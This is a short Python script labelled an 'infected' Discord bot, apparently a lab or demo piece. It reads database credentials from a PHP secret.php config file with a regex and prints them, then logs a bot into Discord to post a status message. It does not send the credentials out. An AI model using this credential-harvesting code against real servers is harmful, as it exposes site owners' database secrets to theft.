# Infected discord bot script

import argparse
import re
import discord
import sys

parser = argparse.ArgumentParser(description="Whines to the discord server")
parser.add_argument("apiFolder", metavar="api", type=str, help="The api folder")
parser.add_argument("discordClientToken", metavar="token", type=str, help="The discord bot client token")

args = parser.parse_args()

api_folder = args.apiFolder
clientToken = args.discordClientToken


# Fetch db username and password

contents = open("%s/secret.php" % api_folder, "r").read()

regex = "db_username *= *\'([a-zA-Z!\".]*)\'[a-zA-Z; \n=]*db_password *= *\'([a-zA-Z0-9]*)\'"

result = re.search(regex, contents)

print("Found username %s and password %s" % (result.group(1), result.group(2)))


# Fire up discord bot
client = discord.Client()

@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('------')
    talk_channel = 0
    for channel in client.get_all_channels():
    	print("Name: %s, id: %s" % (channel.name, channel.id))
    	if channel.name == "botpreik":
    		talk_channel = channel
    		break
    await client.send_message(talk_channel, 'Discord bot is ON')
    sys.exit()

client.run(clientToken)